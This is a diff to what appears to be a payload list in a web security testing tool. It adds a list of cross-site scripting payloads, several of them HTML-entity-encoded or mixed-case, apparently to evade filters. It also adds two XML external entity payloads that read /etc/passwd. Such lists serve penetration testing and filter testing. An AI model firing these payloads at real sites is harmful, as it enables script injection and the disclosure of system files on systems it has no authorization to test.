@@ -532,6 +532,23 @@ union_select_payloads = [
     "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
 ]
 
+xss_waf_payloads = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "';alert('XSS');//",
+    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
+    "'\"><script>alert('XSS')</script>",
+    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+    "&#x3C;img src=x onerror=alert('XSS')&#x3E;",
+    "&#x3C;svg onload=alert('XSS')&#x3E;",
+    "&#x3C;ScRiPt>alert('XSS')&#x3C;/ScRiPt>",
+    "<div onmouseover=alert('XSS')>Hover me</div>",
+    "<input type=text value='XSS' onfocus=alert('XSS')>",
+    "<a href=# data-attribute='javascript:alert('XSS')'>Click me</a>",
+    "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
+    "<!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><pwn>&xxe;</pwn>"
+]
 
 
 reflected_xss_payloads = [
